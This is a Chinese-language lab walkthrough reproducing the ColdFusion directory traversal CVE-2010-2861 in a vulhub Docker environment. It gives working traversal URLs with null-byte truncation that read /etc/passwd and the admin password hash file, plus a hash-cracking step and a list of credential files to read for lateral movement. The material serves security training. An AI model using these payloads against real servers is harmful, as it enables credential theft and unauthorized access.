漏洞描述


Adobe ColdFusion是美国Adobe公司的一款动态Web服务器产品，其运行的CFML（ColdFusion Markup Language）是针对Web应用的一种程序设计语言。


漏洞原理


影响版本

  • Adobe ColdFusion 8

  • Adobe ColdFusion 9

复现机器

  • 靶机：centos7: Docker version 20.10.11

  • 靶机IP：192.168.20.138

  • 攻击机：ubuntu18.04

  • 攻击机IP：192.168.20.135

漏洞复现


 打开环境

打开靶场：

cd /vulhub/coldfusion/CVE-2010-2861/


run:

docker-compose up -d


查看是否开启容器：

docker ps



 信息收集

nmap 端口扫描

sudo nmap -sS -Pn 192.168.20.138

#sudo管理员权限，root用户可以省略


漏洞利用


通过信息收集可以看到我们打开了8500端口，然后访问地址


http://192.168.20.138:8500/CFIDE/administrator/

输入admin,等待初始化




在登陆界面存在目录穿越



http://192.168.20.138:8500/CFIDE/administrator/enter.cfm?locale=locale=../../../../../../../../../../etc/passwd%00en

成功读取到/etc/passwd文件内容

注意：这里%00表示一个空字符，截断



http://192.168.20.138:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en


获得管理员密码


sha-1密码解密

sha-1算法，解密一下,得到密码

解密网站：https://www.cmd5.com/




我们通过这样还可以读取更多的文件，这里我们列一下linux敏感文件

/etc/passwd

记录操作系统用户信息的文件

/etc/shadow

记录操作系统用户密码的文件

/etc/sudoers

sudoers文件与sudo命令相关

或者读取其他服务的配置文件从而横向渗透


关闭靶机

docker-compose down
